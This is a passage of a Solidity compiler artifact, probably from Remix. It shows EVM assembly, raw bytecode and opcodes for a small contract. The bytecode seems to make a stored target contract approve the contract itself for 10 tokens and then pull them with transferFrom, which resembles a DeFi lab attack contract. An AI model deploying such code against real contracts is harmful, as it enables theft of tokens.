     dup6\n        /* \"#utility.yul\":870:892   */\n      add\n        /* \"#utility.yul\":825:902   */\n      tag_61\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":815:902   */\n      swap2\n      pop\n        /* \"#utility.yul\":771:912   */\n      pop\n        /* \"#utility.yul\":699:919   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":925:1043   */\n    tag_71:\n        /* \"#utility.yul\":1012:1036   */\n      tag_73\n        /* \"#utility.yul\":1030:1035   */\n      dup2\n        /* \"#utility.yul\":1012:1036   */\n      tag_74\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1007:1010   */\n      dup3\n        /* \"#utility.yul\":1000:1037   */\n      mstore\n        /* \"#utility.yul\":990:1043   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1049:1158   */\n    tag_75:\n        /* \"#utility.yul\":1130:1151   */\n      tag_77\n        /* \"#utility.yul\":1145:1150   */\n      dup2\n        /* \"#utility.yul\":1130:1151   */\n      tag_78\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1125:1128   */\n      dup3\n        /* \"#utility.yul\":1118:1152   */\n      mstore\n        /* \"#utility.yul\":1108:1158   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1164:1279   */\n    tag_79:\n        /* \"#utility.yul\":1249:1272   */\n      tag_81\n        /* \"#utility.yul\":1266:1271   */\n      dup2\n        /* \"#utility.yul\":1249:1272   */\n      tag_82\n      jump\t// in\n    tag_81:\n        /* \"#utility.yul\":1244:1247   */\n      dup3\n        /* \"#utility.yul\":1237:1273   */\n      mstore\n        /* \"#utility.yul\":1227:1279   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1285:1645   */\n    tag_83:\n      0x00\n        /* \"#utility.yul\":1399:1437   */\n      tag_85\n        /* \"#utility.yul\":1431:1436   */\n      dup3\n        /* \"#utility.yul\":1399:1437   */\n      tag_86\n      jump\t// in\n    tag_85:\n        /* \"#utility.yul\":1453:1523   */\n      tag_87\n        /* \"#utility.yul\":1516:1522   */\n      dup2\n        /* \"#utility.yul\":1511:1514   */\n      dup6\n        /* \"#utility.yul\":1453:1523   */\n      tag_88\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":1446:1523   */\n      swap4\n      pop\n        /* \"#utility.yul\":1532:1584   */\n      tag_89\n        /* \"#utility.yul\":1577:1583   */\n      dup2\n        /* \"#utility.yul\":1572:1575   */\n      dup6\n        /* \"#utility.yul\":1565:1569   */\n      0x20\n        /* \"#utility.yul\":1558:1563   */\n      dup7\n        /* \"#utility.yul\":1554:1570   */\n      add\n        /* \"#utility.yul\":1532:1584   */\n      tag_90\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":1609:1638   */\n      tag_91\n        /* \"#utility.yul\":1631:1637   */\n      dup2\n        /* \"#utility.yul\":1609:1638   */\n      tag_92\n      jump\t// in\n    tag_91:\n        /* \"#utility.yul\":1604:1607   */\n      dup5\n        /* \"#utility.yul\":1600:1639   */\n      add\n        /* \"#utility.yul\":1593:1639   */\n      swap2\n      pop\n        /* \"#utility.yul\":1375:1645   */\n      pop\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1651:1798   */\n    tag_93:\n        /* \"#utility.yul\":1746:1791   */\n      tag_95\n        /* \"#utility.yul\":1785:1790   */\n      dup2\n        /* \"#utility.yul\":1746:1791   */\n      tag_96\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":1741:1744   */\n      dup3\n        /* \"#utility.yul\":1734:1792   */\n      mstore\n        /* \"#utility.yul\":1724:1798   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1804:1989   */\n    tag_97:\n        /* \"#utility.yul\":1918:1982   */\n      tag_99\n        /* \"#utility.yul\":1976:1981   */\n      dup2\n        /* \"#utility.yul\":1918:1982   */\n      tag_100\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":1913:1916   */\n      dup3\n        /* \"#utility.yul\":1906:1983   */\n      mstore\n        /* \"#utility.yul\":1896:1989   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1995:2178   */\n    tag_101:\n        /* \"#utility.yul\":2108:2171   */\n      tag_103\n        /* \"#utility.yul\":2165:2170   */\n      dup2\n        /* \"#utility.yul\":2108:2171   */\n      tag_104\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":2103:2106   */\n      dup3\n        /* \"#utility.yul\":2096:2172   */\n      mstore\n        /* \"#utility.yul\":2086:2178   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2184:2335   */\n    tag_105:\n        /* \"#utility.yul\":2281:2328   */\n      tag_107\n        /* \"#utility.yul\":2322:2327   */\n      dup2\n        /* \"#utility.yul\":2281:2328   */\n      tag_108\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":2276:2279   */\n      dup3\n        /* \"#utility.yul\":2269:2329   */\n      mstore\n        /* \"#utility.yul\":2259:2335   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2341:3227   */\n    tag_17:\n      0x00\n        /* \"#utility.yul\":2642:2645   */\n      0xc0\n        /* \"#utility.yul\":2631:2640   */\n      dup3\n        /* \"#utility.yul\":2627:2646   */\n      add\n        /* \"#utility.yul\":2619:2646   */\n      swap1\n      pop\n        /* \"#utility.yul\":2656:2727   */\n      tag_110\n        /* \"#utility.yul\":2724:2725   */\n      0x00\n        /* \"#utility.yul\":2713:2722   */\n      dup4\n        /* \"#utility.yul\":2709:2726   */\n      add\n        /* \"#utility.yul\":2700:2706   */\n      dup10\n        /* \"#utility.yul\":2656:2727   */\n      tag_71\n      jump\t// in\n    tag_110:\n        /* \"#utility.yul\":2737:2809   */\n      tag_111\n        /* \"#utility.yul\":2805:2807   */\n      0x20\n        /* \"#utility.yul\":2794:2803   */\n      dup4\n        /* \"#utility.yul\":2790:2808   */\n      add\n        /* \"#utility.yul\":2781:2787   */\n      dup9\n        /* \"#utility.yul\":2737:2809   */\n      tag_71\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":2819:2899   */\n      tag_112\n        /* \"#utility.yul\":2895:2897   */\n      0x40\n        /* \"#utility.yul\":2884:2893   */\n      dup4\n        /* \"#utility.yul\":2880:2898   */\n      add\n        /* \"#utility.yul\":2871:2877   */\n      dup8\n        /* \"#utility.yul\":2819:2899   */\n      tag_93\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":2909:2991   */\n      tag_113\n        /* \"#utility.yul\":2987:2989   */\n      0x60\n        /* \"#utility.yul\":2976:2985   */\n      dup4\n        /* \"#utility.yul\":2972:2990   */\n      add\n        /* \"#utility.yul\":2963:2969   */\n      dup7\n        /* \"#utility.yul\":2909:2991   */\n      tag_105\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":3001:3068   */\n      tag_114\n        /* \"#utility.yul\":3063:3066   */\n      0x80\n        /* \"#utility.yul\":3052:3061   */\n      dup4\n        /* \"#utility.yul\":3048:3067   */\n      add\n        /* \"#utility.yul\":3039:3045   */\n      dup6\n        /* \"#utility.yul\":3001:3068   */\n      tag_75\n      jump\t// in\n    tag_114:\n        /* \"#utility.yul\":3116:3125   */\n      dup2\n        /* \"#utility.yul\":3110:3114   */\n      dup2\n        /* \"#utility.yul\":3106:3126   */\n      sub\n        /* \"#utility.yul\":3100:3103   */\n      0xa0\n        /* \"#utility.yul\":3089:3098   */\n      dup4\n        /* \"#utility.yul\":3085:3104   */\n      add\n        /* \"#utility.yul\":3078:3127   */\n      mstore\n        /* \"#utility.yul\":3144:3220   */\n      tag_115\n        /* \"#utility.yul\":3215:3219   */\n      dup2\n        /* \"#utility.yul\":3206:3212   */\n      dup5\n        /* \"#utility.yul\":3144:3220   */\n      tag_83\n      jump\t// in\n    tag_115:\n        /* \"#utility.yul\":3136:3220   */\n      swap1\n      pop\n        /* \"#utility.yul\":2609:3227   */\n      swap8\n      swap7\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3233:3729   */\n    tag_27:\n      0x00\n        /* \"#utility.yul\":3447:3449   */\n      0x60\n        /* \"#utility.yul\":3436:3445   */\n      dup3\n        /* \"#utility.yul\":3432:3450   */\n      add\n        /* \"#utility.yul\":3424:3450   */\n      swap1\n      pop\n        /* \"#utility.yul\":3460:3531   */\n      tag_117\n        /* \"#utility.yul\":3528:3529   */\n      0x00\n        /* \"#utility.yul\":3517:3526   */\n      dup4\n        /* \"#utility.yul\":3513:3530   */\n      add\n        /* \"#utility.yul\":3504:3510   */\n      dup7\n        /* \"#utility.yul\":3460:3531   */\n      tag_71\n      jump\t// in\n    tag_117:\n        /* \"#utility.yul\":3541:3613   */\n      tag_118\n        /* \"#utility.yul\":3609:3611   */\n      0x20\n        /* \"#utility.yul\":3598:3607   */\n      dup4\n        /* \"#utility.yul\":3594:3612   */\n      add\n        /* \"#utility.yul\":3585:3591   */\n      dup6\n        /* \"#utility.yul\":3541:3613   */\n      tag_71\n      jump\t// in\n    tag_118:\n        /* \"#utility.yul\":3623:3722   */\n      tag_119\n        /* \"#utility.yul\":3718:3720   */\n      0x40\n        /* \"#utility.yul\":3707:3716   */\n      dup4\n        /* \"#utility.yul\":3703:3721   */\n      add\n        /* \"#utility.yul\":3694:3700   */\n      dup5\n        /* \"#utility.yul\":3623:3722   */\n      tag_97\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":3414:3729   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3735:4119   */\n    tag_40:\n      0x00\n        /* \"#utility.yul\":3920:3922   */\n      0x40\n        /* \"#utility.yul\":3909:3918   */\n      dup3\n        /* \"#utility.yul\":3905:3923   */\n      add\n        /* \"#utility.yul\":3897:3923   */\n      swap1\n      pop\n        /* \"#utility.yul\":3933:4004   */\n      tag_121\n        /* \"#utility.yul\":4001:4002   */\n      0x00\n        /* \"#utility.yul\":3990:3999   */\n      dup4\n        /* \"#utility.yul\":3986:4003   */\n      add\n        /* \"#utility.yul\":3977:3983   */\n      dup6\n        /* \"#utility.yul\":3933:4004   */\n      tag_71\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":4014:4112   */\n      tag_122\n        /* \"#utility.yul\":4108:4110   */\n      0x20\n        /* \"#utility.yul\":4097:4106   */\n      dup4\n        /* \"#utility.yul\":4093:4111   */\n      add\n        /* \"#utility.yul\":4084:4090   */\n      dup5\n        /* \"#utility.yul\":4014:4112   */\n      tag_101\n      jump\t// in\n    tag_122:\n        /* \"#utility.yul\":3887:4119   */\n      swap4\n      swap3\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4125:4343   */\n    tag_34:\n      0x00\n        /* \"#utility.yul\":4254:4256   */\n      0x20\n        /* \"#utility.yul\":4243:4252   */\n      dup3\n        /* \"#utility.yul\":4239:4257   */\n      add\n        /* \"#utility.yul\":4231:4257   */\n      swap1\n      pop\n        /* \"#utility.yul\":4267:4336   */\n      tag_124\n        /* \"#utility.yul\":4333:4334   */\n      0x00\n        /* \"#utility.yul\":4322:4331   */\n      dup4\n        /* \"#utility.yul\":4318:4335   */\n      add\n        /* \"#utility.yul\":4309:4315   */\n      dup5\n        /* \"#utility.yul\":4267:4336   */\n      tag_79\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":4221:4343   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4349:4658   */\n    tag_11:\n      0x00\n        /* \"#utility.yul\":4498:4500   */\n      0x20\n        /* \"#utility.yul\":4487:4496   */\n      dup3\n        /* \"#utility.yul\":4483:4501   */\n      add\n        /* \"#utility.yul\":4475:4501   */\n      swap1\n      pop\n        /* \"#utility.yul\":4547:4556   */\n      dup2\n        /* \"#utility.yul\":4541:4545   */\n      dup2\n        /* \"#utility.yul\":4537:4557   */\n      sub\n        /* \"#utility.yul\":4533:4534   */\n      0x00\n        /* \"#utility.yul\":4522:4531   */\n      dup4\n        /* \"#utility.yul\":4518:4535   */\n      add\n        /* \"#utility.yul\":4511:4558   */\n      mstore\n        /* \"#utility.yul\":4575:4651   */\n      tag_126\n        /* \"#utility.yul\":4646:4650   */\n      dup2\n        /* \"#utility.yul\":4637:4643   */\n      dup5\n        /* \"#utility.yul\":4575:4651   */\n      tag_83\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":4567:4651   */\n      swap1\n      pop\n        /* \"#utility.yul\":4465:4658   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4664:4762   */\n    tag_86:\n      0x00\n        /* \"#utility.yul\":4749:4754   */\n      dup2\n        /* \"#utility.yul\":4743:4755   */\n      mload\n        /* \"#utility.yul\":4733:4755   */\n      swap1\n      pop\n        /* \"#utility.yul\":4722:4762   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4768:4936   */\n    tag_88:\n      0x00\n        /* \"#utility.yul\":4885:4891   */\n      dup3\n        /* \"#utility.yul\":4880:4883   */\n      dup3\n        /* \"#utility.yul\":4873:4892   */\n      mstore\n        /* \"#utility.yul\":4925:4929   */\n      0x20\n        /* \"#utility.yul\":4920:4923   */\n      dup3\n        /* \"#utility.yul\":4916:4930   */\n      add\n        /* \"#utility.yul\":4901:4930   */\n      swap1\n      pop\n        /* \"#utility.yul\":4863:4936   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4942:5038   */\n    tag_74:\n      0x00\n        /* \"#utility.yul\":5008:5032   */\n      tag_130\n        /* \"#utility.yul\":5026:5031   */\n      dup3\n        /* \"#utility.yul\":5008:5032   */\n      tag_131\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":4997:5032   */\n      swap1\n      pop\n        /* \"#utility.yul\":4987:5038   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5044:5134   */\n    tag_78:\n      0x00\n        /* \"#utility.yul\":5121:5126   */\n      dup2\n        /* \"#utility.yul\":5114:5127   */\n      iszero\n        /* \"#utility.yul\":5107:5128   */\n      iszero\n        /* \"#utility.yul\":5096:5128   */\n      swap1\n      pop\n        /* \"#utility.yul\":5086:5134   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5140:5289   */\n    tag_82:\n      0x00\n        /* \"#utility.yul\":5216:5282   */\n      0xffffffff00000000000000000000000000000000000000000000000000000000\n        /* \"#utility.yul\":5209:5214   */\n      dup3\n        /* \"#utility.yul\":5205:5283   */\n      and\n        /* \"#utility.yul\":5194:5283   */\n      swap1\n      pop\n        /* \"#utility.yul\":5184:5289   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5295:5404   */\n    tag_134:\n      0x00\n        /* \"#utility.yul\":5374:5398   */\n      tag_136\n        /* \"#utility.yul\":5392:5397   */\n      dup3\n        /* \"#utility.yul\":5374:5398   */\n      tag_74\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":5363:5398   */\n      swap1\n      pop\n        /* \"#utility.yul\":5353:5404   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5410:5536   */\n    tag_131:\n      0x00\n        /* \"#utility.yul\":5487:5529   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":5480:5485   */\n      dup3\n        /* \"#utility.yul\":5476:5530   */\n      and\n        /* \"#utility.yul\":5465:5530   */\n      swap1\n      pop\n        /* \"#utility.yul\":5455:5536   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5542:5619   */\n    tag_138:\n      0x00\n        /* \"#utility.yul\":5608:5613   */\n      dup2\n        /* \"#utility.yul\":5597:5613   */\n      swap1\n      pop\n        /* \"#utility.yul\":5587:5619   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5625:5726   */\n    tag_140:\n      0x00\n        /* \"#utility.yul\":5701:5719   */\n      0xffffffffffffffff\n        /* \"#utility.yul\":5694:5699   */\n      dup3\n        /* \"#utility.yul\":5690:5720   */\n      and\n        /* \"#utility.yul\":5679:5720   */\n      swap1\n      pop\n        /* \"#utility.yul\":5669:5726   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5732:5853   */\n    tag_96:\n      0x00\n        /* \"#utility.yul\":5823:5847   */\n      tag_143\n        /* \"#utility.yul\":5841:5846   */\n      dup3\n        /* \"#utility.yul\":5823:5847   */\n      tag_138\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":5810:5847   */\n      swap1\n      pop\n        /* \"#utility.yul\":5800:5853   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5859:5999   */\n    tag_100:\n      0x00\n        /* \"#utility.yul\":5969:5993   */\n      tag_145\n        /* \"#utility.yul\":5987:5992   */\n      dup3\n        /* \"#utility.yul\":5969:5993   */\n      tag_138\n      jump\t// in\n    tag_145:\n        /* \"#utility.yul\":5956:5993   */\n      swap1\n      pop\n        /* \"#utility.yul\":5946:5999   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6005:6143   */\n    tag_104:\n      0x00\n        /* \"#utility.yul\":6114:6137   */\n      tag_147\n        /* \"#utility.yul\":6131:6136   */\n      dup3\n        /* \"#utility.yul\":6114:6137   */\n      tag_140\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":6101:6137   */\n      swap1\n      pop\n        /* \"#utility.yul\":6091:6143   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6149:6272   */\n    tag_108:\n      0x00\n        /* \"#utility.yul\":6242:6266   */\n      tag_149\n        /* \"#utility.yul\":6260:6265   */\n      dup3\n        /* \"#utility.yul\":6242:6266   */\n      tag_138\n      jump\t// in\n    tag_149:\n        /* \"#utility.yul\":6229:6266   */\n      swap1\n      pop\n        /* \"#utility.yul\":6219:6272   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6278:6585   */\n    tag_90:\n        /* \"#utility.yul\":6346:6347   */\n      0x00\n        /* \"#utility.yul\":6356:6469   */\n    tag_151:\n        /* \"#utility.yul\":6370:6376   */\n      dup4\n        /* \"#utility.yul\":6367:6368   */\n      dup2\n        /* \"#utility.yul\":6364:6377   */\n      lt\n        /* \"#utility.yul\":6356:6469   */\n      iszero\n      tag_153\n      jumpi\n        /* \"#utility.yul\":6455:6456   */\n      dup1\n        /* \"#utility.yul\":6450:6453   */\n      dup3\n        /* \"#utility.yul\":6446:6457   */\n      add\n        /* \"#utility.yul\":6440:6458   */\n      mload\n        /* \"#utility.yul\":6436:6437   */\n      dup2\n        /* \"#utility.yul\":6431:6434   */\n      dup5\n        /* \"#utility.yul\":6427:6438   */\n      add\n        /* \"#utility.yul\":6420:6459   */\n      mstore\n        /* \"#utility.yul\":6392:6394   */\n      0x20\n        /* \"#utility.yul\":6389:6390   */\n      dup2\n        /* \"#utility.yul\":6385:6395   */\n      add\n        /* \"#utility.yul\":6380:6395   */\n      swap1\n      pop\n        /* \"#utility.yul\":6356:6469   */\n      jump(tag_151)\n    tag_153:\n        /* \"#utility.yul\":6487:6493   */\n      dup4\n        /* \"#utility.yul\":6484:6485   */\n      dup2\n        /* \"#utility.yul\":6481:6494   */\n      gt\n        /* \"#utility.yul\":6478:6480   */\n      iszero\n      tag_154\n      jumpi\n        /* \"#utility.yul\":6567:6568   */\n      0x00\n        /* \"#utility.yul\":6558:6564   */\n      dup5\n        /* \"#utility.yul\":6553:6556   */\n      dup5\n        /* \"#utility.yul\":6549:6565   */\n      add\n        /* \"#utility.yul\":6542:6569   */\n      mstore\n        /* \"#utility.yul\":6478:6480   */\n    tag_154:\n        /* \"#utility.yul\":6327:6585   */\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6591:6693   */\n    tag_92:\n      0x00\n        /* \"#utility.yul\":6683:6685   */\n      0x1f\n        /* \"#utility.yul\":6679:6686   */\n      not\n        /* \"#utility.yul\":6674:6676   */\n      0x1f\n        /* \"#utility.yul\":6667:6672   */\n      dup4\n        /* \"#utility.yul\":6663:6677   */\n      add\n        /* \"#utility.yul\":6659:6687   */\n      and\n        /* \"#utility.yul\":6649:6687   */\n      swap1\n      pop\n        /* \"#utility.yul\":6639:6693   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6699:6815   */\n    tag_60:\n        /* \"#utility.yul\":6769:6790   */\n      tag_157\n        /* \"#utility.yul\":6784:6789   */\n      dup2\n        /* \"#utility.yul\":6769:6790   */\n      tag_78\n      jump\t// in\n    tag_157:\n        /* \"#utility.yul\":6762:6767   */\n      dup2\n        /* \"#utility.yul\":6759:6791   */\n      eq\n        /* \"#utility.yul\":6749:6751   */\n      tag_158\n      jumpi\n        /* \"#utility.yul\":6805:6806   */\n      0x00\n        /* \"#utility.yul\":6802:6803   */\n      dup1\n        /* \"#utility.yul\":6795:6807   */\n      revert\n        /* \"#utility.yul\":6749:6751   */\n    tag_158:\n        /* \"#utility.yul\":6739:6815   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6821:6969   */\n    tag_64:\n        /* \"#utility.yul\":6907:6944   */\n      tag_160\n        /* \"#utility.yul\":6938:6943   */\n      dup2\n        /* \"#utility.yul\":6907:6944   */\n      tag_134\n      jump\t// in\n    tag_160:\n        /* \"#utility.yul\":6900:6905   */\n      dup2\n        /* \"#utility.yul\":6897:6945   */\n      eq\n        /* \"#utility.yul\":6887:6889   */\n      tag_161\n      jumpi\n        /* \"#utility.yul\":6959:6960   */\n      0x00\n        /* \"#utility.yul\":6956:6957   */\n      dup1\n        /* \"#utility.yul\":6949:6961   */\n      revert\n        /* \"#utility.yul\":6887:6889   */\n    tag_161:\n        /* \"#utility.yul\":6877:6969   */\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212204580eb9422dcfcd2c8f318e3668ea7b3c57dddd005644a32479ca9bb143bfacd64736f6c63430008000033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "60806040523480156200001157600080fd5b5060405162000c8b38038062000c8b8339818101604052810190620000379190620001ba565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663785e9e866040518163ffffffff1660e01b815260040160206040518083038186803b158015620000de57600080fd5b505afa158015620000f3573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906200011991906200018e565b600160006101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff1602179055505062000276565b600081519050620001718162000242565b92915050565b60008151905062000188816200025c565b92915050565b600060208284031215620001a157600080fd5b6000620001b18482850162000160565b91505092915050565b600060208284031215620001cd57600080fd5b6000620001dd8482850162000177565b91505092915050565b6000620001f38262000222565b9050919050565b60006200020782620001e6565b9050919050565b60006200021b82620001e6565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6200024d81620001fa565b81146200025957600080fd5b50565b62000267816200020e565b81146200027357600080fd5b50565b610a0580620002866000396000f3fe608060405234801561001057600080fd5b50600436106100415760003560e01c806305c009db146100465780634fa10cfc14610050578063ba36f4231461006e575b600080fd5b61004e610078565b005b610058610348565b604051610065919061083d565b60405180910390f35b6100766103e7565b005b6000639f29381d60e01b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633e666d20600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600060a06000610112610348565b6040518763ffffffff1660e01b81526004016101339695949392919061075a565b600060405180830381600087803b15801561014d57600080fd5b505af1158015610161573d6000803e3d6000fd5b5050505060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663785e9e866040518163ffffffff1660e01b815260040160206040518083038186803b1580156101cb57600080fd5b505afa1580156101df573d6000803e3d6000fd5b505050506040513d601f19601f82011682018060405250810190610203919061068f565b73ffffffffffffffffffffffffffffffffffffffff166323b872dd60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630678ac7230489e800006040518463ffffffff1660e01b8152600401610267939291906107c2565b602060405180830381600087803b15801561028157600080fd5b505af1158015610295573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906102b99190610666565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166366a3fdb1826040518263ffffffff1660e01b81526004016103139190610822565b600060405180830381600087803b15801561032d57600080fd5b505af1158015610341573d6000803e3d6000fd5b5050505050565b606030678ac7230489e800006040516024016103659291906107f9565b6040516020818303038152906040527f095ea7b3000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905090565b6000639f29381d60e01b905060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16633e666d20600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660008054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600060a06000610481610348565b6040518763ffffffff1660e01b81526004016104a29695949392919061075a565b600060405180830381600087803b1580156104bc57600080fd5b505af11580156104d0573d6000803e3d6000fd5b50505050600160009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166323b872dd60008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1630678ac7230489e800006040518463ffffffff1660e01b815260040161055b939291906107c2565b602060405180830381600087803b15801561057557600080fd5b505af1158015610589573d6000803e3d6000fd5b505050506040513d601f19601f820116820180604052508101906105ad9190610666565b5060008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166366a3fdb1826040518263ffffffff1660e01b81526004016106079190610822565b600060405180830381600087803b15801561062157600080fd5b505af1158015610635573d6000803e3d6000fd5b5050505050565b60008151905061064b816109a1565b92915050565b600081519050610660816109b8565b92915050565b60006020828403121561067857600080fd5b60006106868482850161063c565b91505092915050565b6000602082840312156106a157600080fd5b60006106af84828501610651565b91505092915050565b6106c18161087b565b82525050565b6106d08161088d565b82525050565b6106df81610899565b82525050565b60006106f08261085f565b6106fa818561086a565b935061070a81856020860161095d565b61071381610990565b840191505092915050565b61072781610915565b82525050565b61073681610927565b82525050565b61074581610939565b82525050565b6107548161094b565b82525050565b600060c08201905061076f60008301896106b8565b61077c60208301886106b8565b610789604083018761071e565b610796606083018661074b565b6107a360808301856106c7565b81810360a08301526107b581846106e5565b9050979650505050505050565b60006060820190506107d760008301866106b8565b6107e460208301856106b8565b6107f1604083018461072d565b949350505050565b600060408201905061080e60008301856106b8565b61081b602083018461073c565b9392505050565b600060208201905061083760008301846106d6565b92915050565b6000602082019050818103600083015261085781846106e5565b905092915050565b600081519050919050565b600082825260208201905092915050565b6000610886826108d7565b9050919050565b60008115159050919050565b60007fffffffff0000000000000000000000000000000000000000000000000000000082169050919050565b60006108d08261087b565b9050919050565b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b6000819050919050565b600067ffffffffffffffff82169050919050565b6000610920826108f7565b9050919050565b6000610932826108f7565b9050919050565b600061094482610901565b9050919050565b6000610956826108f7565b9050919050565b60005b8381101561097b578082015181840152602081019050610960565b8381111561098a576000848401525b50505050565b6000601f19601f8301169050919050565b6109aa8161088d565b81146109b557600080fd5b50565b6109c1816108c5565b81146109cc57600080fd5b5056fea26469706673582212204580eb9422dcfcd2c8f318e3668ea7b3c57dddd005644a32479ca9bb143bfacd64736f6c63430008000033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH3 0x11 JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH3 0xC8B CODESIZE SUB DUP1 PUSH3 0xC8B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH3 0x37 SWAP2 SWAP1 PUSH3 0x1BA JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0x785E9E86 PUSH1 0x40 MLOAD DUP2 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH1 0x20 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 DUP7 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH3 0xDE JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP GAS STATICCALL ISZERO DUP1 ISZERO PUSH3 0xF3 JUMPI RETURNDATASIZE PUSH1 0x0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH1 0x0 REVERT JUMPDEST POP POP POP POP PUSH1 0x40 MLOAD RETURNDATASIZE 